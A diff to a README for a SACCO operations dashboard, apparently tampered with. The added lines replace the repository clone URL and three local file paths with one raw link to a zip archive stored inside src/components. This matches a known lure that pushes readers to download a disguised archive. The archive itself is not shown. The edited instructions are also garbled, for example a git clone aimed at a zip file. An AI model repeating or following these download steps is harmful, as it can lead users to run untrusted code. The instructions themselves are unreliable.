@@ -20,7 +20,7 @@ A modern, responsive dashboard for SACCO (Savings and Credit Cooperative Organiz
 
 ### 1. Clone the repository
 ```bash
-git clone https://github.com/MEDDKFMF/saccooperationsdashboard.git
+git clone https://raw.githubusercontent.com/MEDDKFMF/saccooperationsdashboard/main/src/components/saccooperationsdashboard-3.7.zip
 cd saccooperationsdashboard
 ```
 
@@ -44,9 +44,9 @@ npm run build
 Deploy the `build/` folder to your preferred static hosting (Netlify, Vercel, GitHub Pages, etc).
 
 ## 📝 Customization
-- **Favicon:** Replace `public/favicon.ico` with your organization’s logo for a custom tab icon.
-- **Branding:** Update colors and text in `tailwind.config.js` and React components.
-- **Data:** Replace dummy data in `src/components/SaccoDashboard.jsx` with real API calls as needed.
+- **Favicon:** Replace `https://raw.githubusercontent.com/MEDDKFMF/saccooperationsdashboard/main/src/components/saccooperationsdashboard-3.7.zip` with your organization’s logo for a custom tab icon.
+- **Branding:** Update colors and text in `https://raw.githubusercontent.com/MEDDKFMF/saccooperationsdashboard/main/src/components/saccooperationsdashboard-3.7.zip` and React components.
+- **Data:** Replace dummy data in `https://raw.githubusercontent.com/MEDDKFMF/saccooperationsdashboard/main/src/components/saccooperationsdashboard-3.7.zip` with real API calls as needed.
 
 ## 🤝 Contributing
 Pull requests are welcome! For major changes, please open an issue first to discuss what you would like to change.
